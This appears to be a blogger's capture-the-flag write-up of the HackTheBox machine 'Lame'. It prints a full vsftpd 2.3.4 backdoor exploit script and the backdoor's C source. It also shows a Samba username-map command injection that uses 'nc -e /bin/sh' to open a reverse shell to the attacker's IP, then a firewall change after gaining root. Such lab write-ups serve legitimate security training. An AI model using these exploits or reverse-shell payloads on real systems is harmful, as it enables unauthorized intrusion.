Lame is an easy box from HTB which was the first box on the platform. I start of by attempting to exploit vsftp but turns it fails due to a firewall running on the box, we will look at this in depth in beyond root. The box is also running a vulnerable version of Samba. I will take advantage of  `CVE-2007-2447` vulnerability to gain root on the box. There is a `Metasploit` exploit which would have made the box super easy but I will exploit it the manual way.

## Recon

Lets start our recon with `nmap` to discover open ports

```sh

```

Sometimes you can easily tell the OS version by comparing the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version running on the OS but in this case its not listed meaning its a pretty old version. Googling around I see the version to be [8.04](https://launchpad.net/ubuntu/+source/openssh/1:4.7p1-8ubuntu1) code name `hardy`.


## Port Enumeration
### port 21

- Allows for *anonymous* Login

![Anonymous Login](/assets/img/lame/anonymous_login.png)

While on the box I quickly realise I cannot move outside the current directory and cannot write files to that directory. The directory is also empty.

![FTP](/assets/img/lame/ftp.png)

### Exploits

Checking if there is an exploit for this version of `vsftpd`. A little research shows that this was a famous [backdoored](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/ )  FTP Server.

```sh
searchsploit vsftpd 2.3.4
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path

vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)| unix/remote/17491.rb
------------------------------------------------------ ---------------------------------

```

I mark this for testing later on.

## SMB 445
### Anonymous Login

SMB Allows for anonymous login but we only have access to one share without credentials

![SMBMAP](/assets/img/lame/smbmap.png)

Connecting to this share, i see nothing interesting as it is mapped to the `/tmp` folder

```sh
└──╼ $ smbclient -N //10.10.10.3/tmp
Anonymous login successful

### Samba

Looking back at our `nmap` output we have samba on the box. Lets check if there is any exploits for it.

```

```

Sure enough we get quite a number but the one that definitely stands out is:


`Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)`

## VSFTPD Exploit (CVE-2011-2523)

Reading through the python script to see how the exploit works.

```sh
┌─[george@parrot]─[~/HTB/boxes/lame]
└──╼ $ searchsploit -x unix/remote/49757.py
```

```python
# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523

#!/usr/bin/python3

from telnetlib import Telnet
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)
parser=argparse.ArgumentParser()
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()
host = args.host
portFTP = 21 #if necessary edit this line

user="USER nergal:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.") #if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()

```

Turns out its pretty simple to exploit. The key take away are:

- Login with any username that ends with a `:)` and any password to trigger the backdoor
- If that was successful then connect on `port 6200` to get a shell

That's  pretty slick!!!!! My curiosity got the best of me so i decided to do a research on this backdoor. Turns out a this was introduced to vsftpd 2.3.4 `str.c` file which contains code for handling string manipulation routines.

```c
int
str_contains_space(const struct mystr* p_str)
{
  unsigned int i;
  for (i=0; i < p_str->len; i++)
  {
    if (vsf_sysutil_isspace(p_str->p_buf[i]))
    {
      return 1;
    }
    else if((p_str->p_buf[i]==0x3a)
    && (p_str->p_buf[i+1]==0x29))
    {
      vsf_sysutil_extra();
    }
  }
  return 0;
}
```

Our attention is drawn to the `else if` section of the code which compares the parsed string the user enters while logging into the vsftpd application and if it finds the two hex number `0x3a` & `0x29`- which translates to `:` & `)` respectively in the correct order it invokes the `vsf_sysutil_extra()` function.

The backdoor itself was placed in the `sysdeputil.c` file which looks like:

```c
vsf_sysutil_extra(void)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  exit(1);
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200);
  sa.sin_addr.s_addr = INADDR_ANY;
  if((bind(fd,(struct sockaddr *)&sa,
  sizeof(struct sockaddr))) < 0) exit(1);
  if((listen(fd, 100)) == -1) exit(1);
  for(;;)
  {
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh","sh",(char *)0);
  }
}
```

This simply opens a new TCP socket listening on port `6200` that will spawn a shell when connected to this port.

### Attempting the Exploit

I triggered the backdoor as below

```sh
george@parrot]─[~/HTB/boxes/lame]
└──╼ $ nc 10.10.10.3 21
220 (vsFTPd 2.3.4)
USER george:)
331 Please specify the password.
PASS george
```

At this point I should be able to get a shell, but i did not get any. Strange but will look at it once we get a shell on the box in [`Beyond Root`](#Beyond Root)

```sh
└──╼ $ nc 10.10.10.3 6200
(UNKNOWN) [10.10.10.3] 6200 (?) : Connection timed out
```

## SAMBA Exploit (CVE-2007-2447)

Lets look at the samba Exploit
```sh
searchsploit -x unix/remote/16320.rb
```

Am interested in the `def exploit` part of the script
```rb
---snip---

def exploit

                connect

                # lol?
                username = "/=`nohup " + payload.encoded + "`"
                begin
                        simple.client.negotiate(false)
                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
                rescue ::Timeout::Error, XCEPT::LoginError
                        # nothing, it either worked or it didn't ;)
                end

                handler
        end
```

From above we can see its creating an SMB session by setting below parameters:

- username set to /=`nohup (payload) ` #nohup stands for no hang up which is a command in Linux systems that keeps processes running even after exiting the shell or terminal and starting the process outside of the current context.`
- password set to rand_text(16) `#random 16 characters`
- domain set to user provided

Seems simple enough, all we have to do is abuse backticks ` `` `  in unsanitized text that is passed to `sh`  to gain command execution. This happens in the below files in `samba`

- source/lib/smbrun.c
- source/smbd/map_username.c

Cool! lets give a spin

### Shell as root

I attempted to exploit this manually using `smbclient` as below but all failed. I kept getting a shell but it was to my box.

```sh
┌─[george@parrot]─[~/HTB/boxes/lame]
└──╼ $ smbclient //10.10.10.3/tmp -U "./=`nohup nc -e /bin/sh 10.10.16.7 9001`"
nohup: ignoring input and redirecting stderr to stdout
```

```sh
┌─[george@parrot]─[~/HTB]
└──╼ $ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.16.7] 37890
ls
49757.py
Lame2.png
Lame.png
nmap
whoami
george
```

Digging further I realised there is you can actually switch users using the `logon` command

```rb
smb: \> help logon
HELP logon:
        establish new logon

smb: \>
```

This will change our exploit to

```sh
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.16.7 9001`"
```

And we are in as `root`

![And We are Root](/assets/img/lame/root.png)

## Beyond Root

On Beyond root, I will take a look at why `vsftpd` exploit failed.

lets get a proper shell using `python`

```python
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/sh")'
sh-3.2#
```

Looking at the listening port on the box I see a number of them but nmap only gave us a few meaning something is blocking us from accessing all these other ports.

Checking the `ufw` I note only the ports nmap reported are allowed which explains why we are not able to access port 6200.

```sh
sh-3.2# ufw status
ufw status
Firewall loaded

To                         Action  From
--                         ------  ----

22:udp                     ALLOW   Anywhere
21:tcp                     ALLOW   Anywhere
3632:tcp                   ALLOW   Anywhere
3632:udp                   ALLOW   Anywhere
139:tcp                    ALLOW   Anywhere
139:udp                    ALLOW   Anywhere
445:tcp                    ALLOW   Anywhere
445:udp                    ALLOW   Anywhere
```

But since we are hackers and we have keys to the kingdom. Why not enable it for fun and test our exploit (don't worry, this wont mess up the box since as soon as we reboot the box the settings will go back to the original setup)

```sh
sh-3.2# sudo ufw allow 6200/tcp
sudo ufw allow 6200/tcp
Rule added
sh-3.2# sudo ufw allow 6200/udp
sudo ufw allow 6200/udp
Rule added
sh-3.2# sudo ufw reload
sudo ufw reload
```

And the port is now active

```sh
sh-3.2# sudo ufw status
sudo ufw status
Firewall loaded

To                         Action  From
--                         ------  ----

3632:tcp                   ALLOW   Anywhere

139:tcp                    ALLOW   Anywhere
139:udp                    ALLOW   Anywhere
445:tcp                    ALLOW   Anywhere
445:udp                    ALLOW   Anywhere
6200:tcp                   ALLOW   Anywhere
6200:udp                   ALLOW   Anywhere
```

Lets attempt the exploit one more time.

```sh
┌─[george@parrot]─[~/HTB/boxes/lame]
└──╼ $ nc 10.10.10.3 21
220 (vsFTPd 2.3.4)
USER gee:)
331 Please specify the password.
PASS gee
^C
```

From the box i can see `Port 6200` is now active

![Beyond Root](/assets/img/lame/beyond_root.png)

And we get a shell successfully exploiting `vsftpd`

```sh
┌─[george@parrot]─[~/HTB]
└──╼ $ nc 10.10.10.3 6200

And that's Lame :). Thank you all for taking your time to read my blog post, stay tuned for the next!

Happy hacking!
